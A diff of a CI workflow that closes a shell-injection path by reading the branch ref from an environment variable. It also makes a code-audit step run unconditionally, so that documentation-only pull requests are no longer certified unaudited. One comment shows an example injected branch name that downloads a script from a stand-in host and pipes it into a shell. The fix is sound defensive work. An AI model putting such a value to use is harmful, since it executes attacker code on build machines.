@@ -26,14 +26,25 @@ jobs:
 
       - name: Extract Changed Python Files
         id: changed-files
+        env:
+          # Never interpolated into the shell. Git permits `;`, `$`, `(`, `)`, `|` and
+          # backticks in a ref name, so a branch called `x;curl host.example.com|sh` would
+          # become two commands here. Actions substitutes expressions before bash parses
+          # anything; reading the value from the environment removes that path entirely,
+          # which is the rule `autonomous-triage.yml` already applies to an issue body.
+          BASE_REF: ${{ github.base_ref }}
         run: |
-          git diff --name-only origin/${{ github.base_ref }}...HEAD | grep '\.py$' > /tmp/changed_py_files.txt || true
+          git diff --name-only "origin/${BASE_REF}...HEAD" | grep '\.py$' > /tmp/changed_py_files.txt || true
           echo "files_count=$(wc -l < /tmp/changed_py_files.txt)" >> "$GITHUB_OUTPUT"
           cat /tmp/changed_py_files.txt
 
       - name: Run Sentinel on Changed Files
         id: sentinel
-        if: steps.changed-files.outputs.files_count > 0
+        # Deliberately unconditional. Guarding this on `files_count > 0` meant a
+        # documentation-only pull request skipped the audit and still reached
+        # `if: success()` below, which applied a `certified-by-sentinel` label to work the
+        # sentinel had never looked at — Observation 11's failure mode, in the workflow
+        # named after the sentinel. The step now always runs and states what it audited.
         run: |
           # Deleted paths are filtered out; the sentinel fails on targets that no longer exist.
           while IFS= read -r py_file; do
@@ -44,6 +55,8 @@ jobs:
           if [ -s /tmp/existing_py_files.txt ]; then
             # One consolidated audit: the sentinel accepts N paths and reports every violation.
             xargs -r -a /tmp/existing_py_files.txt python examples/ast-invariant-sentinel/sentinel.py || VIOLATIONS=1
+          else
+            echo "No Python files changed in this pull request; nothing for the sentinel to audit."
           fi
 
           echo "total_violations=${VIOLATIONS}" >> "$GITHUB_OUTPUT"
